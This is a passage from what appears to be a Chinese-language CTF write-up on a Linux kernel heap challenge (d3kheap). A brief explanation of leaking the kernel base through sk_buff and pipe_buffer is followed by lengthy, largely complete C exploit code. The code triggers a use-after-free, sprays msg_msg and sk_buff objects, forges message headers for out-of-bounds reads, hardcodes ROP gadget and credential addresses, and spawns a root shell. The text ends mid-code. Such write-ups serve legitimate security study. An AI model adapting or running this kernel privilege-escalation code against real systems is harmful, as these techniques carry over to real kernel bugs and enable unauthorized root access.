<code>sk_buf</code> 泄露 <code>pipe_buffer-&gt;ops</code>
从而泄露内核基址。然后参考方法 1 修改 <code>pipe_buffer</code>
提权。</p>
<p>由于 <code>sk_buff</code>
既可以写又可以读并且不会立即释放，相对于第一种方法只能
<code>msg_msg</code> 读，<code>setxattr</code>
写来说利用方式更加容易，可以借助堆喷提升成功率，对利用环境要求更小。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifndef</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdbool.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">bind_core</span><span class="params">(<span class="type">int</span> core)</span> &#123;</span><br><span class="line">    <span class="type">cpu_set_t</span> cpu_set;</span><br><span class="line"></span><br><span class="line">    CPU_ZERO(&amp;cpu_set);</span><br><span class="line">    CPU_SET(core, &amp;cpu_set);</span><br><span class="line">    sched_setaffinity(getpid(), <span class="keyword">sizeof</span>(cpu_set), &amp;cpu_set);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> user_cs, user_rflags, user_sp, user_ss;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">save_status</span><span class="params">()</span> &#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_rflags;&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] status has been saved.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">qword_dump</span><span class="params">(<span class="type">char</span> *desc, <span class="type">void</span> *addr, <span class="type">int</span> len)</span> &#123;</span><br><span class="line">    <span class="type">uint64_t</span> *buf64 = (<span class="type">uint64_t</span> *) addr;</span><br><span class="line">    <span class="type">uint8_t</span> *buf8 = (<span class="type">uint8_t</span> *) addr;</span><br><span class="line">    <span class="keyword">if</span> (desc != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[*] %s:\n&quot;</span>, desc);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len / <span class="number">8</span>; i += <span class="number">4</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;  %04x&quot;</span>, i * <span class="number">8</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j++) &#123;</span><br><span class="line">            i + j &lt; len ? <span class="built_in">printf</span>(<span class="string">&quot; 0x%016lx&quot;</span>, buf64[i + j]) : <span class="built_in">printf</span>(<span class="string">&quot;                   &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;   &quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">32</span> &amp;&amp; j + i &lt; len; j++) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, <span class="built_in">isprint</span>(buf8[i * <span class="number">8</span> + j]) ? buf8[i * <span class="number">8</span> + j] : <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> *<span class="title">next</span>, *<span class="title">prev</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* one msg_msg structure for each message */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">m_list</span>;</span></span><br><span class="line">    <span class="type">long</span> m_type;</span><br><span class="line">    <span class="type">size_t</span> m_ts;        <span class="comment">/* message text size */</span></span><br><span class="line">    <span class="type">void</span> *next;         <span class="comment">/* struct msg_msgseg *next; */</span></span><br><span class="line">    <span class="type">void</span> *security;     <span class="comment">/* NULL without SELinux */</span></span><br><span class="line">    <span class="comment">/* the actual message follows immediately */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> *<span class="title">next</span>;</span></span><br><span class="line">    <span class="comment">/* the next part of the message follows immediately */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> MSG_COPY</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MSG_COPY 040000</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PAGE_SIZE 0x1000</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DATALEN_MSG    ((size_t)PAGE_SIZE-sizeof(struct msg_msg))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DATALEN_SEG    ((size_t)PAGE_SIZE-sizeof(struct msg_msgseg))</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">get_msg_queue</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> msgget(IPC_PRIVATE, <span class="number">0666</span> | IPC_CREAT);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">long</span> <span class="title function_">read_msg</span><span class="params">(<span class="type">int</span> msqid, <span class="type">void</span> *msgp, <span class="type">size_t</span> msgsz, <span class="type">long</span> msgtyp)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> msgrcv(msqid, msgp, msgsz, msgtyp, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">write_msg</span><span class="params">(<span class="type">int</span> msqid, <span class="type">void</span> *msgp, <span class="type">size_t</span> msgsz, <span class="type">long</span> msgtyp)</span> &#123;</span><br><span class="line">    ((<span class="keyword">struct</span> msgbuf *) msgp)-&gt;mtype = msgtyp;</span><br><span class="line">    <span class="keyword">return</span> msgsnd(msqid, msgp, msgsz, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">long</span> <span class="title function_">peek_msg</span><span class="params">(<span class="type">int</span> msqid, <span class="type">void</span> *msgp, <span class="type">size_t</span> msgsz, <span class="type">long</span> msgtyp)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> msgrcv(msqid, msgp, msgsz, msgtyp, MSG_COPY | IPC_NOWAIT | MSG_NOERROR);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">build_msg</span><span class="params">(<span class="type">void</span> *msg, <span class="type">uint64_t</span> m_list_next, <span class="type">uint64_t</span> m_list_prev,</span></span><br><span class="line"><span class="params">               <span class="type">uint64_t</span> m_type, <span class="type">uint64_t</span> m_ts, <span class="type">uint64_t</span> next, <span class="type">uint64_t</span> security)</span> &#123;</span><br><span class="line">    ((<span class="keyword">struct</span> msg_msg *) msg)-&gt;m_list.next = (<span class="type">void</span> *) m_list_next;</span><br><span class="line">    ((<span class="keyword">struct</span> msg_msg *) msg)-&gt;m_list.prev = (<span class="type">void</span> *) m_list_prev;</span><br><span class="line">    ((<span class="keyword">struct</span> msg_msg *) msg)-&gt;m_type = (<span class="type">long</span>) m_type;</span><br><span class="line">    ((<span class="keyword">struct</span> msg_msg *) msg)-&gt;m_ts = m_ts;</span><br><span class="line">    ((<span class="keyword">struct</span> msg_msg *) msg)-&gt;next = (<span class="type">void</span> *) next;</span><br><span class="line">    ((<span class="keyword">struct</span> msg_msg *) msg)-&gt;security = (<span class="type">void</span> *) security;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="type">long</span> mtype;</span><br><span class="line">    <span class="type">char</span> mtext[DATALEN_MSG + DATALEN_SEG];</span><br><span class="line">&#125; oob_msgbuf;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SOCKET_NUM 8</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SK_BUFF_NUM 128</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">init_socket_array</span><span class="params">(<span class="type">int</span> sk_socket[SOCKET_NUM][<span class="number">2</span>])</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; SOCKET_NUM; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (socketpair(AF_UNIX, SOCK_STREAM, <span class="number">0</span>, sk_socket[i]) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[x] failed to create no.%d socket pair!\n&quot;</span>, i);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">spray_sk_buff</span><span class="params">(<span class="type">int</span> sk_socket[SOCKET_NUM][<span class="number">2</span>], <span class="type">void</span> *buf, <span class="type">size_t</span> size)</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; SOCKET_NUM; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; SK_BUFF_NUM; j++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (write(sk_socket[i][<span class="number">0</span>], buf, size) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;[x] failed to spray %d sk_buff for %d socket!&quot;</span>, j, i);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">free_sk_buff</span><span class="params">(<span class="type">int</span> sk_socket[SOCKET_NUM][<span class="number">2</span>], <span class="type">void</span> *buf, <span class="type">size_t</span> size)</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; SOCKET_NUM; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; SK_BUFF_NUM; j++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (read(sk_socket[i][<span class="number">1</span>], buf, size) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="built_in">puts</span>(<span class="string">&quot;[x] failed to received sk_buff!&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_inode_info</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* read start from len to offset, write start from offset */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> offset, len;</span><br><span class="line">    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span> *<span class="title">ops</span>;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> flags;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> private;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span> &#123;</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * -&gt;confirm() verifies that the data in the pipe buffer is there</span></span><br><span class="line"><span class="comment">     * and that the contents are good. If the pages in the pipe belong</span></span><br><span class="line"><span class="comment">     * to a file system, we may need to wait for IO completion in this</span></span><br><span class="line"><span class="comment">     * hook. Returns 0 for good, or a negative error value in case of</span></span><br><span class="line"><span class="comment">     * error.  If not present all pages are considered good.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">int</span> (*confirm)(<span class="keyword">struct</span> pipe_inode_info *, <span class="keyword">struct</span> pipe_buffer *);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * When the contents of this pipe buffer has been completely</span></span><br><span class="line"><span class="comment">     * consumed by a reader, -&gt;release() is called.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">void</span> (*release)(<span class="keyword">struct</span> pipe_inode_info *, <span class="keyword">struct</span> pipe_buffer *);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Attempt to take ownership of the pipe buffer and its contents.</span></span><br><span class="line"><span class="comment">     * -&gt;try_steal() returns %true for success, in which case the contents</span></span><br><span class="line"><span class="comment">     * of the pipe (the buf-&gt;page) is locked and now completely owned by the</span></span><br><span class="line"><span class="comment">     * caller. The page may then be transferred to a different mapping, the</span></span><br><span class="line"><span class="comment">     * most often used case is insertion into different file address space</span></span><br><span class="line"><span class="comment">     * cache.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">int</span> (*try_steal)(<span class="keyword">struct</span> pipe_inode_info *, <span class="keyword">struct</span> pipe_buffer *);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Get a reference to the pipe buffer.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">int</span> (*get)(<span class="keyword">struct</span> pipe_inode_info *, <span class="keyword">struct</span> pipe_buffer *);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">bool</span> <span class="title function_">is_kernel_text_addr</span><span class="params">(<span class="type">size_t</span> addr)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> addr &gt;= <span class="number">0xFFFFFFFF80000000</span> &amp;&amp; addr &lt;= <span class="number">0xFFFFFFFFFEFFFFFF</span>;</span><br><span class="line"><span class="comment">//    return addr &gt;= 0xFFFFFFFF80000000 &amp;&amp; addr &lt;= 0xFFFFFFFF9FFFFFFF;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">bool</span> <span class="title function_">is_dir_mapping_addr</span><span class="params">(<span class="type">size_t</span> addr)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> addr &gt;= <span class="number">0xFFFF888000000000</span> &amp;&amp; addr &lt;= <span class="number">0xFFFFc87FFFFFFFFF</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">get_shell</span><span class="params">()</span> &#123; system(<span class="string">&quot;cat flag;/bin/sh&quot;</span>); &#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> d3heap_fd;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">chunk_add</span><span class="params">()</span> &#123;</span><br><span class="line">    ioctl(d3heap_fd, <span class="number">0x1234</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">chunk_delete</span><span class="params">()</span> &#123;</span><br><span class="line">    ioctl(d3heap_fd, <span class="number">0xdead</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PRIMARY_MSG_SIZE 0x60</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SECONDARY_MSG_SIZE 0x400</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PIPE_NUM 256</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HEAP_SIZE 1024</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MSG_QUE_NUM 4096</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MSG_TAG 0x1145141919810</span></span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> init_cred = <span class="number">0xffffffff82c6d580</span>;</span><br><span class="line"><span class="type">size_t</span> commit_creds = <span class="number">0xffffffff810d25c0</span>;</span><br><span class="line"><span class="type">size_t</span> swapgs_restore_regs_and_return_to_usermode = <span class="number">0xffffffff81c00ff0</span>;</span><br><span class="line"><span class="type">size_t</span> pop_rdi_ret = <span class="number">0xffffffff810938f0</span>;</span><br><span class="line"><span class="type">size_t</span> push_rsi_pop_rsp_pop_rbx_pop_r12_pop_r13_pop_rbp_ret = <span class="number">0xffffffff812dbede</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="type">long</span> mtype;</span><br><span class="line">    <span class="type">char</span> mtext[SECONDARY_MSG_SIZE - <span class="keyword">sizeof</span>(<span class="keyword">struct</span> msg_msg)];</span><br><span class="line">&#125; msgbuf;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> fake_msg[<span class="number">704</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    bind_core(<span class="number">0</span>);</span><br><span class="line">    save_status();</span><br><span class="line">    <span class="type">int</span> sk_sockets[SOCKET_NUM][<span class="number">2</span>];</span><br><span class="line">    init_socket_array(sk_sockets);</span><br><span class="line">    d3heap_fd = open(<span class="string">&quot;/dev/d3kheap&quot;</span>, O_RDONLY);</span><br><span class="line">    <span class="type">int</span> msqid[MSG_QUE_NUM];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; MSG_QUE_NUM; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((msqid[i] = get_msg_queue()) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;[-] mdgget failed.&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    chunk_add();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; MSG_QUE_NUM; i++) &#123;</span><br><span class="line">        <span class="built_in">memset</span>(msgbuf.mtext, <span class="string">&#x27;A&#x27;</span> + (i % <span class="number">26</span>), <span class="keyword">sizeof</span>(msgbuf.mtext));</span><br><span class="line">        <span class="keyword">if</span> (write_msg(msqid[i], &amp;msgbuf, <span class="keyword">sizeof</span>(msgbuf.mtext), MSG_TAG) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;[-] msgnd failed.&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (i == MSG_QUE_NUM / <span class="number">2</span>) &#123;</span><br><span class="line">            chunk_delete();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    chunk_delete();</span><br><span class="line"></span><br><span class="line">    build_msg(fake_msg, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">-1</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (spray_sk_buff(sk_sockets, fake_msg, <span class="keyword">sizeof</span>(fake_msg)) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[-] failed to spary sk_buff.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> victim_qid = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; MSG_QUE_NUM; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (peek_msg(msqid[i], &amp;msgbuf, <span class="keyword">sizeof</span>(msgbuf.mtext), <span class="number">0</span>) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[+] victim qid: %d\n&quot;</span>, i);</span><br><span class="line">            victim_qid = i;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (victim_qid == <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[-] failed to find uaf msg_queue.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (free_sk_buff(sk_sockets, fake_msg, <span class="keyword">sizeof</span>(fake_msg)) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[-] failed to release sk_buff.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(fake_msg, <span class="string">&#x27;#&#x27;</span>, <span class="keyword">sizeof</span>(fake_msg));</span><br><span class="line">    build_msg(fake_msg, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, DATALEN_MSG, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (spray_sk_buff(sk_sockets, fake_msg, <span class="keyword">sizeof</span>(fake_msg)) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[-] failed to spary sk_buff.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (peek_msg(msqid[victim_qid], &amp;oob_msgbuf, DATALEN_MSG, <span class="number">0</span>) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[-] failed to peek msg.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] oob_msgbuf.mtype: %ld\n&quot;</span>, oob_msgbuf.mtype);</span><br><span class="line">    qword_dump(<span class="string">&quot;try to find nearby secondary msg&quot;</span>, oob_msgbuf.mtext, DATALEN_MSG);</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> nearby_msg_que = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> msg_msg_offset = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="keyword">sizeof</span>(msgbuf.mtext); i &lt; DATALEN_MSG; i += HEAP_SIZE) &#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> *<span class="title">msg_msg</span> =</span> (<span class="type">void</span> *) &amp;oob_msgbuf.mtext[i];</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;type: %p\n&quot;</span>, msg_msg-&gt;m_type);</span><br><span class="line">        <span class="keyword">if</span> (msg_msg-&gt;m_type == MSG_TAG &amp;&amp; msg_msg-&gt;next == <span class="literal">NULL</span></span><br><span class="line">            &amp;&amp; is_dir_mapping_addr((<span class="type">size_t</span>) msg_msg-&gt;m_list.prev)</span><br><span class="line">            &amp;&amp; msg_msg-&gt;m_list.prev == msg_msg-&gt;m_list.next</span><br><span class="line">            &amp;&amp; msg_msg-&gt;m_ts == <span class="keyword">sizeof</span>(msgbuf.mtext)) &#123;</span><br><span class="line">            nearby_msg_que = (<span class="type">size_t</span>) msg_msg-&gt;m_list.next;</span><br><span class="line">            msg_msg_offset = i + <span class="keyword">sizeof</span>(<span class="keyword">struct</span> msg_msg);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[+] nearby msg_queue: %p\n&quot;</span>, nearby_msg_que);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!nearby_msg_que) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[-] failed to find nearby msg_queue.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (free_sk_buff(sk_sockets, fake_msg, <span class="keyword">sizeof</span>(fake_msg)) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[-] failed to release sk_buff.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    build_msg(fake_msg, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, DATALEN_MSG + DATALEN_MSG, nearby_msg_que - <span class="number">8</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (spray_sk_buff(sk_sockets, fake_msg, <span class="keyword">sizeof</span>(fake_msg)) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[-] failed to spary sk_buff.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (peek_msg(msqid[victim_qid], &amp;oob_msgbuf, DATALEN_MSG + DATALEN_SEG, <span class="number">0</span>) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[-] failed to peek msg.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] oob_msgbuf.mtype: %ld\n&quot;</span>, oob_msgbuf.mtype);</span><br><span class="line">    qword_dump(<span class="string">&quot;leak msg_msg addr&quot;</span>, &amp;oob_msgbuf.mtext[DATALEN_MSG], DATALEN_SEG);</span><br><span class="line">    <span class="type">size_t</span> victim_addr = *(<span class="type">size_t</span> *) &amp;oob_msgbuf.mtext[DATALEN_MSG] - msg_msg_offset;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] victim addr: %p\n&quot;</span>, victim_addr);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (free_sk_buff(sk_sockets, fake_msg, <span class="keyword">sizeof</span>(fake_msg)) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[-] failed to release sk_buff.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    build_msg(fake_msg, victim_addr + <span class="number">0x800</span>, victim_addr + <span class="number">0x800</span>, <span class="number">1</span>, <span 